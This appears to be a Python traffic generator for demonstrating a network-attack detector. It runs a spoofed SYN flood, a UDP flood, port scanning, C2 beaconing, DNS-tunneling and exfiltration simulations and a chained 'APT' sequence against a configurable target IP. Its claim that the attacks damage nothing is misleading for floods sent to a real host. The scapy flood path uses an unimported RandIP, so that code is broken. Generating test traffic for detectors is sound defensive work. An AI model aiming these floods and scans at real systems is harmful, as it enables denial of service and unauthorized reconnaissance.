#!/usr/bin/env python3
"""
EKADHARA Attack Simulator — Standalone attack generators for PS-26145 demo.
All attacks target localhost by default. Change TARGET to your server IP.
Run each script independently. They do NOT block or damage anything.
"""

import argparse
import random
import socket
import struct
import sys
import time
from datetime import datetime

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────
TARGET_IP   = "127.0.0.1"
TARGET_PORT = 8000       # your server listening port
DURATION    = 30         # seconds each attack runs
PROBABILITY = 1.0        # how often each attack actually sends (set <1 for sparse)

# ──────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ──────────────────────────────────────────────────────────────────────────────
def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log(msg: str):
    try:
        print(f"[{ts()}] [ATTACK] {msg}")
    except UnicodeEncodeError:
        print(f"[{ts()}] [ATTACK] {msg}".encode('ascii', 'replace').decode())

def rand_hex(n=4):
    return "".join(random.choice("0123456789abcdef") for _ in range(n))

def rand_ip() -> str:
    return f"10.{(random.randint(0,255))}.{(random.randint(0,255))}.{(random.randint(0,255))}"

def make_udp_packet(data: bytes) -> bytes:
    """Raw UDP packet (no real IP header, just payload for raw socket)."""
    return data

def should_send() -> bool:
    return random.random() < PROBABILITY

# ──────────────────────────────────────────────────────────────────────────────
# 1. SYN FLOOD  (Volumetric DDoS)
# ──────────────────────────────────────────────────────────────────────────────
def syn_flood(duration: int = DURATION):
    """
    Rapid TCP SYN packets with spoofed source IPs.
    This creates the classic half-open connection flood.
    Uses scapy if available, otherwise raw sockets with SYN flags.
    """
    log(f"Starting SYN flood → {TARGET_IP}:{TARGET_PORT} for {duration}s")

    try:
        from scapy.all import IP, TCP, send, RandShort
        log("Using scapy for packet crafting")
        pkt = IP(src=RandIP(), dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S", seq=random.randint(1000,99999))
        send(pkt, inter=0.001, count=duration*1000, verbose=0)
    except ImportError:
        log("scapy not available — using raw socket burst")
        end = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        while time.time() < end:
            try:
                src_port = random.randint(1024, 65535)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((TARGET_IP, TARGET_PORT))
                s.close()
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            time.sleep(0.002)

    log("SYN flood complete")

# ──────────────────────────────────────────────────────────────────────────────
# 2. UDP REFLECTION / AMPLIFICATION  (Volumetric DDoS)
# ──────────────────────────────────────────────────────────────────────────────
def udp_flood(duration: int = DURATION):
    """
    Large UDP datagrams to random high ports — simulates reflection/amplification.
    """
    log(f"Starting UDP flood → {TARGET_IP} for {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"".join([struct.pack("!B", random.randint(0, 255)) for _ in range(1024)])
    end = time.time() + duration
    while time.time() < end:
        if should_send():
            port = random.randint(1, 65535)
            sock.sendto(payload, (TARGET_IP, port))
        time.sleep(0.001)
    log("UDP flood complete")

# ──────────────────────────────────────────────────────────────────────────────
# 3. C2 BEACONING  (Botnet Command & Control)
# ──────────────────────────────────────────────────────────────────────────────
def c2_beacon(duration: int = DURATION, interval: float = 5.0, jitter: float = 1.5):
    """
    Periodic beaconing to a C2 server — regular heartbeats with random jitter.
    This creates the periodic IAT pattern that beacon detectors catch.
    """
    log(f"Starting C2 beacon → {TARGET_IP}:{TARGET_PORT} every ~{interval}s (±{jitter}s) for {duration}s")
    end = time.time() + duration
    beacon_id = rand_hex(8)
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((TARGET_IP, TARGET_PORT))
            beacon_payload = f"BEACON/{beacon_id}/{(random.randint(1000,99999))}".encode()
            sock.send(beacon_payload)
            sock.close()
            log(f"Beacon sent ({beacon_id})")
        except (ConnectionRefusedError, OSError, socket.timeout):
            pass
        sleep_time = interval + random.uniform(-jitter, jitter)
        time.sleep(max(0.5, sleep_time))
    log("C2 beacon complete")

# ──────────────────────────────────────────────────────────────────────────────
# 4. PORT SCAN  (Reconnaissance)
# ──────────────────────────────────────────────────────────────────────────────
def port_scan(duration: int = DURATION):
    """
    Sequential port scan across many ports — fan-out pattern triggers port scan detectors.
    """
    log(f"Starting port scan → {TARGET_IP} for {duration}s")
    ports = list(range(1, 1025)) + random.sample(range(1025, 65536), 200)
    random.shuffle(ports)
    end = time.time() + duration
    idx = 0
    while time.time() < end and idx < len(ports):
        port = ports[idx]
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            result = sock.connect_ex((TARGET_IP, port))
            if result == 0:
                log(f"Port {port} OPEN")
            sock.close()
        except OSError:
            pass
        idx += 1
        time.sleep(0.01)
    log(f"Port scan complete — scanned {idx} ports")

# ──────────────────────────────────────────────────────────────────────────────
# 5. DNS TUNNELING SIMULATION  (Data Exfiltration)
# ──────────────────────────────────────────────────────────────────────────────
def dns_tunnel(duration: int = DURATION):
    """
    Sends long, high-entropy DNS query names to simulate DNS tunneling.
    Generates names like: XyZ7aB2cD9fG1hJ4kL8mN.pQ3rS6tU.example.com
    """
    log(f"Starting DNS tunnel simulation → sending to {TARGET_IP}:53 for {duration}s")
    entropy_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    end = time.time() + duration
    count = 0
    while time.time() < end:
        if should_send():
            subdomain = "".join(random.choices(entropy_chars, k=random.randint(20, 63)))
            query = f"{subdomain}.ekadhara.local"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Build a minimal DNS query
                tid = random.randint(0, 65535)
                flags = 0x0100  # standard query
                qdcount = 1
                header = struct.pack("!HHHHHH", tid, flags, qdcount, 0, 0, 0)
                qname = b"".join(bytes([len(x)]) + x.encode() for x in query.split(".")) + b"\x00"
                qtype = 1  # A record
                qclass = 1
                question = qname + struct.pack("!HH", qtype, qclass)
                sock.sendto(header + question, (TARGET_IP, 53))
                count += 1
            except OSError:
                pass
        time.sleep(0.05)
    log(f"DNS tunnel complete — sent {count} queries")

# ──────────────────────────────────────────────────────────────────────────────
# 6. TLS FINGERPRINT ANOMALY  (Malware in encrypted sessions)
# ──────────────────────────────────────────────────────────────────────────────
def tls_anomaly(duration: int = DURATION):
    """
    Connects with unusual TLS Client Hello patterns — simulated JA3 fingerprint mismatches.
    In practice this would send crafted TLS hellos; here we simulate by rapid TLS connections
    with varying cipher suites that don't match common browser fingerprints.
    """
    log(f"Starting TLS anomaly simulation → {TARGET_IP}:{TARGET_PORT} for {duration}s")
    # Unusual TLS signatures mapped to known malware JA3 hashes
    malware_ja3 = [
        "769,46-47-53,0-10-11-13-35-51-52",       # Generic malware
        "49172-49171-156-157,47-53,0-10-11-13-35",  # Emotet variant
        "49200-159-158-107-52393,47-53,0",           # TrickBot
    ]
    end = time.time() + duration
    count = 0
    while time.time() < end:
        if should_send():
            ja3_hash = random.choice(malware_ja3)
            try:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                # Set minimal TLS version for anomaly
                ctx.minimum_version = ssl.TLSVersion.TLSv1
                sock = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=1)
                try:
                    tls_sock = ctx.wrap_socket(sock, server_hostname="malicious.example.com")
                    tls_sock.send(f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode())
                    tls_sock.close()
                    count += 1
                except ssl.SSLError:
                    pass
            except (OSError, ConnectionRefusedError):
                pass
        time.sleep(0.1)
    log(f"TLS anomaly complete — {count} anomalous connections")

# ──────────────────────────────────────────────────────────────────────────────
# 7. DATA EXFILTRATION  (Asymmetric outbound traffic)
# ──────────────────────────────────────────────────────────────────────────────
def exfiltration(duration: int = DURATION):
    """
    Sends large outbound data chunks — simulates data exfiltration over DNS/HTTP.
    High outbound byte ratio triggers exfiltration detectors.
    """
    log(f"Starting data exfiltration simulation → {TARGET_IP} for {duration}s")
    # Simulate exfil by sending large payloads in small chunks
    exfil_payload = b"".join([struct.pack("!B", random.randint(65, 90)) for _ in range(4096)])
    end = time.time() + duration
    total_bytes = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((TARGET_IP, TARGET_PORT))
        while time.time() < end:
            chunk = exfil_payload[:random.randint(256, 2048)]
            try:
                sock.send(chunk)
                total_bytes += len(chunk)
            except OSError:
                break
            time.sleep(0.05)
        sock.close()
    except (ConnectionRefusedError, OSError):
        log("Target not reachable — exfiltration simulated (no actual data sent)")
    log(f"Exfiltration complete — ~{total_bytes:,} bytes exfiltrated")

# ──────────────────────────────────────────────────────────────────────────────
# MULTI-ATTACK CHAIN
# ──────────────────────────────────────────────────────────────────────────────
def attack_chain(duration: int = 60):
    """
    Runs a realistic attack chain: port scan → beaconing → exfiltration.
    This is what a real APT would do.
    """
    log(f"=== Starting APT attack chain for {duration}s ===")
    chain = [
        ("RECON",   lambda: port_scan(min(10, duration // 6))),
        ("BEACON",  lambda: c2_beacon(duration // 3, interval=4.0)),
        ("EXFIL",   lambda: exfiltration(min(15, duration // 4))),
        ("DDoS",    lambda: syn_flood(min(10, duration // 6))),
    ]
    start = time.time()
    for name, attack_fn in chain:
        remaining = duration - (time.time() - start)
        if remaining <= 0:
            break
        log(f"--- Phase: {name} ---")
        attack_fn()
    log("=== Attack chain complete ===")

# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────
ATTACKS = {
    "syn":      ("SYN Flood (DDoS)", syn_flood),
    "udp":      ("UDP Flood (DDoS)", udp_flood),
    "beacon":   ("C2 Beaconing",     c2_beacon),
    "scan":     ("Port Scan",        port_scan),
    "dns":      ("DNS Tunneling",    dns_tunnel),
    "tls":      ("TLS Anomaly",      tls_anomaly),
    "exfil":    ("Data Exfiltration",exfiltration),
    "chain":    ("APT Attack Chain", attack_chain),
}

_PARSER = argparse.ArgumentParser(
    description="EKADHARA Attack Simulator — generates network attack traffic for demo",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""
Examples:
  python attack_sim.py syn              # SYN flood for 30s
  python attack_sim.py beacon -d 60     # Beacon for 60s
  python attack_sim.py scan -t 10.0.0.1 # Scan a specific target
  python attack_sim.py chain -d 120     # Full APT chain for 2 minutes
  python attack_sim.py all              # Run every attack sequentially
""",
)
_PARSER.add_argument("attack", nargs="?", default="help",
                    help=f"Attack type: {', '.join(ATTACKS.keys())}")
_PARSER.add_argument("-t", "--target", default=TARGET_IP, help=f"Target IP (default: {TARGET_IP})")
_PARSER.add_argument("-p", "--port", type=int, default=TARGET_PORT, help=f"Target port (default: {TARGET_PORT})")
_PARSER.add_argument("-d", "--duration", type=int, default=DURATION, help=f"Duration in seconds (default: {DURATION})")
_PARSER.add_argument("--sparse", type=float, default=1.0, help="Probability 0-1 of sending each packet (sparse mode)")

def main():
    global TARGET_IP, TARGET_PORT, DURATION, PROBABILITY
    args = _PARSER.parse_args()

    if args.attack == "help" or args.attack not in ATTACKS:
        print(__doc__)
        print("Available attacks:")
        for key, (name, _) in ATTACKS.items():
            print(f"  {key:12s} → {name}")
        print("\nUse 'all' to run every attack sequentially.")
        sys.exit(0)

    TARGET_IP   = args.target
    TARGET_PORT = args.port
    DURATION    = args.duration
    PROBABILITY = args.sparse

    if args.attack == "all":
        for key, (name, fn) in ATTACKS.items():
            if key == "all":
                continue
            print(f"\n{'='*60}")
            print(f"  Running: {name}")
            print(f"{'='*60}")
            fn(DURATION // len(ATTACKS))
        print(f"\n{'='*60}")
        print("  ALL ATTACKS COMPLETE")
        print(f"{'='*60}")
    else:
        name, fn = ATTACKS[args.attack]
        fn(args.duration)

if __name__ == "__main__":
    main()
